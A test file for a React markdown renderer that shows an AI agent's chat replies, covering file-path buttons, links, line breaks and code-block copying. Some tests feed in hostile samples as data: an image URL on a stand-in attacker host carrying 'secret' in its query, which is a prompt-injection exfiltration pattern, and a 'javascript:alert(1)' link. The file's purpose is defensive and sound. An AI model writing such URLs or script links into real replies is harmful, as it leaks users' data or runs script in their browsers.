import { act, fireEvent, render, screen, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ChatMarkdown, ProjectFiles } from "./chat-markdown.tsx";

/**
 * The agent's replies as markdown. What matters here is what the renderer does with the parts a
 * model can write that a person did not: an image that would load on its own, a link around a
 * path, a link whose scheme was stripped.
 */

function reply(text: string, onOpenFile?: (path: string) => void) {
  return render(
    <ProjectFiles value={{ files: ["src/App.tsx"], onOpenFile }}>
      <ChatMarkdown text={text} streaming={false} />
    </ProjectFiles>,
  );
}

describe("a path in a reply", () => {
  it("is a button that opens the file when the pane can open files", () => {
    const onOpenFile = vi.fn();
    reply("Look at `src/App.tsx`.", onOpenFile);

    fireEvent.click(screen.getByRole("button", { name: "Open src/App.tsx" }));

    expect(onOpenFile).toHaveBeenCalledWith("src/App.tsx");
  });

  it("is plain text when it cannot, rather than a button that does nothing", () => {
    reply("Look at `src/App.tsx`.");

    expect(screen.queryByRole("button")).toBeNull();
    expect(screen.getByText("src/App.tsx")).toBeInTheDocument();
  });

  it("is not a second control inside a link", () => {
    reply("[`src/App.tsx`](https://github.com/org/repo/blob/main/src/App.tsx)", vi.fn());

    expect(within(screen.getByRole("link")).queryByRole("button")).toBeNull();
  });
});

describe("an image in a reply", () => {
  it("loads nothing, and is a link somebody can choose to follow", () => {
    // An image URL is fetched the moment it renders, and the model reads untrusted text.
    reply("![status](https://attacker.example/p.png?d=secret)");

    expect(screen.queryByRole("img")).toBeNull();
    expect(screen.getByRole("link", { name: "status" })).toHaveAttribute(
      "href",
      "https://attacker.example/p.png?d=secret",
    );
  });

  it("is named by its host when it has no alt text", () => {
    reply("![](https://attacker.example/p.png)");

    expect(screen.queryByRole("img")).toBeNull();
    expect(screen.getByRole("link", { name: "attacker.example" })).toBeInTheDocument();
  });
});

describe("links in a reply", () => {
  it("draws a link whose scheme was stripped as its text alone", () => {
    reply("[click me](javascript:alert(1))");

    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("click me")).toBeInTheDocument();
  });

  it("keeps a link to the reply itself in this tab", () => {
    reply("[see below](#notes)");

    expect(screen.getByRole("link", { name: "see below" })).not.toHaveAttribute("target");
  });

  it("opens any other link in a new tab", () => {
    reply("[docs](https://example.com)");

    expect(screen.getByRole("link", { name: "docs" })).toHaveAttribute("target", "_blank");
  });
});

describe("a hard break", () => {
  // A `br` has no role, which is why these ask for the element.
  it("breaks a paragraph once, not twice", () => {
    // Paragraphs keep their newlines, so a newline after the `<br>` would be a second break.
    const { container } = reply("one  \ntwo");

    const paragraph = container.querySelector("p");
    expect(paragraph?.querySelectorAll("br")).toHaveLength(1);
    expect(paragraph?.textContent).toBe("onetwo");
  });

  it("still breaks a tight list item, which keeps no newlines", () => {
    const { container } = reply("- one  \n  two\n- three");

    const item = screen.getAllByRole("listitem")[0];
    expect(item?.querySelector("br")).not.toBeNull();
    expect(item?.textContent).toBe("onetwo");
    expect(container.querySelectorAll("li p")).toHaveLength(0);
  });
});

describe("copying a code block", () => {
  const original = Object.getOwnPropertyDescriptor(navigator, "clipboard");
  afterEach(() => {
    if (original === undefined) Reflect.deleteProperty(navigator, "clipboard");
    else Object.defineProperty(navigator, "clipboard", original);
  });

  it("says nothing was copied when the clipboard refuses, rather than failing unhandled", async () => {
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: { writeText: vi.fn(() => Promise.reject(new Error("denied"))) },
    });
    reply("```\nbun run build\n```");

    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "Copy code" }));
    });

    expect(screen.getByRole("button", { name: "Copy code" })).toBeInTheDocument();
  });
});
